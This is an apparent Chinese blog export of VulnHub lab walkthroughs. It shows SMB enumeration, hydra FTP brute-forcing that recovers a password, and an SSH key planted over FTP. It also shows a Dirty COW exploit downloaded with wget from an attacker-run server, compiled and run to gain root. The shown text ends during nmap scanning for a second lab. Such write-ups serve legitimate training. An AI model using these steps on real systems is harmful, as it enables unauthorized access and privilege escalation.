NT_STATUS_ACCESS_DENIED<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ smbclient //192.168.56.104/smbdata<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br>Anonymous login successful<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Fri Jun 23 06:43:28 2023<br>  ..                                  D        0  Tue Feb 18 06:47:54 2020<br>  anaconda                            D        0  Tue Feb 18 06:48:15 2020<br>  audit                               D        0  Tue Feb 18 06:48:15 2020<br>  boot.log                            N     6120  Tue Feb 18 06:48:16 2020<br>  btmp                                N      384  Tue Feb 18 06:48:16 2020<br>  cron                                N     4813  Tue Feb 18 06:48:16 2020<br>  dmesg                               N    31389  Tue Feb 18 06:48:16 2020<br>  dmesg.old                           N    31389  Tue Feb 18 06:48:16 2020<br>  glusterfs                           D        0  Tue Feb 18 06:48:16 2020<br>  lastlog                             N   292292  Tue Feb 18 06:48:16 2020<br>  maillog                             N     1982  Tue Feb 18 06:48:16 2020<br>  messages                            N   684379  Tue Feb 18 06:48:17 2020<br>  ppp                                 D        0  Tue Feb 18 06:48:17 2020<br>  samba                               D        0  Tue Feb 18 06:48:17 2020<br>  secure                              N    11937  Tue Feb 18 06:48:17 2020<br>  spooler                             N        0  Tue Feb 18 06:48:17 2020<br>  tallylog                            N        0  Tue Feb 18 06:48:17 2020<br>  tuned                               D        0  Tue Feb 18 06:48:17 2020<br>  wtmp                                N    25728  Tue Feb 18 06:48:17 2020<br>  xferlog                             N      100  Tue Feb 18 06:48:17 2020<br>  yum.log                             N    10915  Tue Feb 18 06:48:17 2020<br>  sshd_config                         N     3906  Wed Feb 19 02:46:38 2020<br><br>                19976192 blocks of size 1024. 18153160 blocks available<br>smb: \&gt; <span class="hljs-built_in">pwd</span><br>Current directory is \\192.168.56.104\smbdata\<br></code></pre></td></tr></table></figure><p>一个登录失败，另一个还是刚才看到的日志信息。</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>考虑到之前拿到的密码一直没用上，那就利用刚才收集的用户，先尝试 ssh 爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/myfileserver]<br>└─$ hydra -L user -P passwd 192.168.56.104 ssh<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-25 05:30:52<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries (l:13/p:1), ~1 try per task<br>[DATA] attacking ssh://192.168.56.104:22/<br>[ERROR] target ssh://192.168.56.104:22/ does not support password authentication (method reply 36).<br><br></code></pre></td></tr></table></figure><p>似乎不支持密码登录，回头再处理吧。试试 ftp 爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/myfileserver]<br>└─$ hydra -L user -P passwd 192.168.56.104 ftp<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-25 05:32:14<br>[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries (l:13/p:1), ~1 try per task<br>[DATA] attacking ftp://192.168.56.104:21/<br>[21][ftp] host: 192.168.56.104   login: smbuser   password: rootroot1<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-25 05:32:18<br></code></pre></td></tr></table></figure><p>ftp 竟然还有个 <code>smbuser</code> 用户，那我们就登陆这个用户看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/myfileserver]<br>└─$ ftp 192.168.56.104        <br>Connected to 192.168.56.104.<br>220 (vsFTPd 3.0.2)<br>Name (192.168.56.104:kali): smbuser<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /home/smbuser<br>tp&gt; <span class="hljs-built_in">ls</span> -liah<br>drwx------    2 1000     1000           79 Feb 18  2020 .<br>drwxr-xr-x    3 0        0              20 Feb 19  2020 ..<br>-rw-------    1 1000     1000           27 Feb 20  2020 .bash_history<br>-rw-r--r--    1 1000     1000           18 Mar 05  2015 .bash_logout<br>-rw-r--r--    1 1000     1000          193 Mar 05  2015 .bash_profile<br>-rw-r--r--    1 1000     1000          231 Mar 05  2015 .bashrc<br></code></pre></td></tr></table></figure><p>翻找来翻找去，只发现了 sshd_config 文件的权限设置的比较怪，同时借助于 passwd 文件确定了这个系统中有 bash 权限的只有 <code>smbuser</code> 和 <code>root</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">ls</span> -laih<br>drwxr-xr-x    2 0        0            4096 Feb 20  2020 .<br>drwxr-xr-x   86 0        0            8192 Feb 20  2020 ..<br>-rw-r--r--    1 0        0          581843 Aug 09  2019 moduli<br>-rw-r--r--    1 0        0            2276 Aug 09  2019 ssh_config<br>-rw-r-----    1 0        999           227 Feb 19  2020 ssh_host_ecdsa_key<br>-rw-r--r--    1 0        0             162 Feb 19  2020 ssh_host_ecdsa_key.pub<br>-rw-r-----    1 0        999           387 Feb 19  2020 ssh_host_ed25519_key<br>-rw-r--r--    1 0        0              82 Feb 19  2020 ssh_host_ed25519_key.pub<br>-rw-r-----    1 0        999          1679 Feb 19  2020 ssh_host_rsa_key<br>-rw-r--r--    1 0        0             382 Feb 19  2020 ssh_host_rsa_key.pub<br>-rwxrwxrwx    1 0        0            3929 Feb 20  2020 sshd_config<br></code></pre></td></tr></table></figure><p>一开始以为是要修改 sshd_config 文件，但是修改了却无法使之生效。因此只能尝试另一种方法：通过上传公钥来远程登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="hljs-comment"># but this is overridden so installations will only check .ssh/authorized_keys</span><br>AuthorizedKeysFile      .ssh/authorized_keys<br></code></pre></td></tr></table></figure><p>首先使用 ssh-keygen 命令来生成公私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/myfileserver]<br>└─$ sudo ssh-keygen                               <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/root/.ssh/id_rsa): smbuser<br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> smbuser<br>Your public key has been saved <span class="hljs-keyword">in</span> smbuser.pub<br>The key fingerprint is:<br>SHA256:CRKLhVZPo8026EZ5w3XTuItuKSNdRMjnnsDQQTy200Q root@kali<br>The key\<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+---[RSA 3072]----+</span><br><span class="hljs-string">|   o+==+E oo     |</span><br><span class="hljs-string">|  oo.%Bo+....    |</span><br><span class="hljs-string">| .. B+@O   .     |</span><br><span class="hljs-string">|   o +=++..      |</span><br><span class="hljs-string">|    o  =So .     |</span><br><span class="hljs-string">|   .    = .      |</span><br><span class="hljs-string">|     . o .       |</span><br><span class="hljs-string">|    . + +        |</span><br><span class="hljs-string">|     . +         |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br></code></pre></td></tr></table></figure><p>通过 put 命令来上传文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /home/smbuser/.ssh<br>ftp&gt; put authorized_keys<br><span class="hljs-built_in">local</span>: authorized_keys remote: authorized_keys<br>229 Entering Extended Passive Mode (|||5950|).<br>150 Ok to send data.<br>100% |***********************************************************************|   563        4.66 MiB/s    00:00 ETA<br>226 Transfer complete.<br>563 bytes sent <span class="hljs-keyword">in</span> 00:00 (883.92 KiB/s)<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||5981|).<br>150 Here comes the directory listing.<br>-rw-r--r--    1 1000     1000          563 Jun 25 10:46 authorized_keys<br>226 Directory send OK<br></code></pre></td></tr></table></figure><p>ssh 私钥登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/myfileserver]<br>└─$ sudo ssh -i smbuser smbuser@192.168.56.119<br>The authenticity of host \<span class="hljs-string">&#x27;192.168.56.119 (192.168.56.119)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:ccn0TgE4/OXtSpg3oMO2gVNYXrps4Zi+XcBgaDZnW78.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.119<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">   ##############################################################################################</span><br><span class="hljs-string">   #                                      Armour Infosec                                        #</span><br><span class="hljs-string">   #                         --------- www.armourinfosec.com ------------                       #</span><br><span class="hljs-string">   #                                    My File Server - 1                                      #</span><br><span class="hljs-string">   #                               Designed By  :- Akanksha Sachin Verma                        #</span><br><span class="hljs-string">   #                               Twitter      :- @akankshavermasv                             #</span><br><span class="hljs-string">   ##############################################################################################</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Thu Feb 20 16:42:21 2020</span><br><span class="hljs-string">[smbuser@fileserver ~]$ whoami</span><br><span class="hljs-string">smbuser</span><br><span class="hljs-string">[smbuser@fileserver ~]$ ls</span><br><span class="hljs-string">[smbuser@fileserver ~]$ id</span><br><span class="hljs-string">uid=1000(smbuser) gid=1000(smbuser) groups=1000(smbuser)</span><br><span class="hljs-string">[smbuser@fileserver ~]$ uname -a</span><br><span class="hljs-string">Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>定时任务和 s 权限都没有收获</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">[smbuser@fileserver ~]$ <span class="hljs-built_in">cat</span> /etc/crontab<br>SHELL=/bin/bash<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br><br>[smbuser@fileserver ~]$ <span class="hljs-built_in">ls</span> -liah /etc/crontab<br>34310891 -rw-r--r--. 1 root root 451 Jun 10  2014 /etc/crontab<br>[smbuser@fileserver ~]$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>34179364   64 -rwsr-xr-x   1 root     root        64200 Mar  6  2015 /usr/bin/chage<br>34179365   80 -rwsr-xr-x   1 root     root        78168 Mar  6  2015 /usr/bin/gpasswd<br>34175860   44 -rwsr-xr-x   1 root     root        41752 Mar  6  2015 /usr/bin/newgrp<br>34182648   44 -rwsr-xr-x   1 root     root        44232 Mar  6  2015 /usr/bin/mount<br>34179705   24 -rws--x--x   1 root     root        23960 Mar  6  2015 /usr/bin/chfn<br>34179486   24 -rws--x--x   1 root     root        23856 Mar  6  2015 /usr/bin/chsh<br>34182663   32 -rwsr-xr-x   1 root     root        32064 Mar  6  2015 /usr/bin/su<br>34182667   32 -rwsr-xr-x   1 root     root        31960 Mar  6  2015 /usr/bin/umount<br>34362148   28 -rwsr-xr-x   1 root     root        27656 Jun 10  2014 /usr/bin/pkexec<br>34362174   60 -rwsr-xr-x   1 root     root        57536 Jul 30  2014 /usr/bin/crontab<br>34676864  128 ---s--x--x   1 root     root       130720 Mar  6  2015 /usr/bin/sudo<br>34296737  208 ---s--x---   1 root     stapusr    212080 Oct 18  2019 /usr/bin/staprun<br>34631418   28 -rwsr-xr-x   1 root     root        27832 Jun 10  2014 /usr/bin/passwd<br>67395239   12 -rwsr-xr-x   1 root     root        11208 Mar  6  2015 /usr/sbin/pam_timestamp_check<br>67395241   36 -rwsr-xr-x   1 root     root        36264 Mar  6  2015 /usr/sbin/unix_chkpwd<br>67574143   12 -rwsr-xr-x   1 root     root        11296 Aug  9  2019 /usr/sbin/usernetctl<br>68676026  116 -rwsr-xr-x   1 root     root       117432 Aug  9  2019 /usr/sbin/mount.nfs<br>67585748   16 -rwsr-xr-x   1 root     root        15416 Jun 10  2014 /usr/lib/polkit-1/polkit-agent-helper-1<br>101817405   60 -rwsr-x---   1 root     dbus        58024 Mar 14  2019 /usr/libexec/dbus-1/dbus-daemon-launch-helper<br>[smbuser@fileserver ~]$ systemd-run -t bash<br>Failed to start transient service unit: Interactive authentication required.<br>[smbuser@fileserver ~]$ sudo systemd-run -t bash<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[sudo] password <span class="hljs-keyword">for</span> smbuser:<br></code></pre></td></tr></table></figure><p>环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[smbuser@fileserver ~]$ <span class="hljs-built_in">export</span> <span class="hljs-variable">$PATH</span><br>-bash: <span class="hljs-built_in">export</span>: `/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/smbuser/.local/bin:/home/smbuser/bin<span class="hljs-string">&#x27;: not a valid identifier</span><br></code></pre></td></tr></table></figure><p>尝试使用各种内核漏洞进行提取</p><p><img src="/pic/f91c6d5415dc9f8de286d01526f3665e_MD5.png"></p><p><code>&#39;Mutagen Astronomy&#39; Local Privilege Escalation </code> 需要内存在 32G 以上，<code>SUID Position Independent Executable &#39;PIE&#39; Local Privilege Escalation</code> 程序运行错误，<code>Linux Kernel 3.14.5 (CentOS 7 / RHEL) - &#39;libfutex&#39; Local Privilege Escalation </code> 无返回，<code>Kernel 3.14-rc1 &lt; 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation </code> 一直处于运行状态。最后的确有点不耐烦了，之后就是去搜索引擎，尝试搜索 <code>kernel 3.10 exploit privilege</code> 关键词，在其中找到了一个脏牛漏洞，利用成功</p><p><img src="/pic/61b4c7a6874edc19975c0a99b652ec52_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[smbuser@fileserver tmp]$ wget http://192.168.56.106:8088/40847.cpp<br>--2023-06-25 18:26:09--  http://192.168.56.106:8088/40847.cpp<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 10212 (10.0K) [text/x-c++src]<br>Saving to: ‘40847.cpp’<br><br>100%[============================================================================&gt;] 10,212      --.-K/s   <span class="hljs-keyword">in</span> 0s      <br><br>2023-06-25 18:26:09 (396 MB/s) - ‘40847.cpp’ saved [10212/10212]<br><br>[smbuser@fileserver tmp]$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil<br>[smbuser@fileserver tmp]$ <span class="hljs-built_in">ls</span><br>40847.cpp  dcow<br>[smbuser@fileserver tmp]$ ./dcow <br>Running ...<br>Received su prompt (Password: )<br>Root password is:   dirtyCowFun<br>Enjoy! :-)<br>[smbuser@fileserver tmp]$ su -<br>Password: <br>Last login: Sun Jun 25 18:26:29 IST 2023 on pts/1<br>[root@fileserver ~]<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>[root@fileserver ~]<span class="hljs-comment"># whoami</span><br>root<br>[root@fileserver ~]<span class="hljs-comment"># cd /root</span><br>[root@fileserver ~]<span class="hljs-comment"># ls</span><br>proof.txt<br>[root@fileserver ~]<span class="hljs-comment"># cat proof.txt </span><br>Best of Luck<br>af52e0163b03cbf7c6dd146351594a43<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>me and my girlfriend</title>
    <link href="/2023/06/adda61b946af.html"/>
    <url>/2023/06/adda61b946af.html</url>
    
    <content type="html"><![CDATA[<h1 id="ME-AND-MY-GIRLFRIEND-1-靶机"><a href="#ME-AND-MY-GIRLFRIEND-1-靶机" class="headerlink" title="ME AND MY GIRLFRIEND 1 靶机"></a>ME AND MY GIRLFRIEND 1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>存活端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.118<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 11:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.118<br>Host is up (0.00011s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:6E:E1:A4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.93 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -sC -p22,80 192.168.56.118       <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 11:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.118<br>Host is up (0.00034s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)<br>|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)<br>|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)<br>|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="hljs-string">MAC Address: 08:00:27:6E:E1:A4 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 3.X|4.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-string">OS details: Linux 3.2 - 4.9</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></code></pre></td></tr></table></figure><p>已获得信息：开放了 22 端口和 80 端口，Ubuntu 操作系统。UDP 端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.118    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 11:28 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.118<br>Host is up (0.00030s latency).                                             <br><br>PORT      STATE         SERVICE                                                                      <br>53/udp    closed        domain                                                                       <br>67/udp    closed        dhcps                                                                        <br>68/udp    open|filtered dhcpc                                                                        <br>69/udp    open|filtered tftp                                                                         <br>123/udp   open|filtered ntp                                                                          <br>135/udp   closed        msrpc                                                                        <br>137/udp   closed        netbios-ns                                                                   <br>138/udp   closed        netbios-dgm                                                                  <br>139/udp   closed        netbios-ssn                                                                  <br>161/udp   closed        snmp                                                                         <br>162/udp   open|filtered snmptrap                                                                     <br>445/udp   closed        microsoft-ds                                                                 <br>500/udp   open|filtered isakmp                                                                       <br>514/udp   closed        syslog<br>520/udp   open|filtered route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 08:00:27:6E:E1:A4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.29 seconds<br>                                                                                                     <br>┌──(kali㉿kali)-[~]<br>└─$ tftp 192.168.56.118                               <br>tftp&gt;<br></code></pre></td></tr></table></figure><p>tftp 服务开启，但是无法查看文件列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 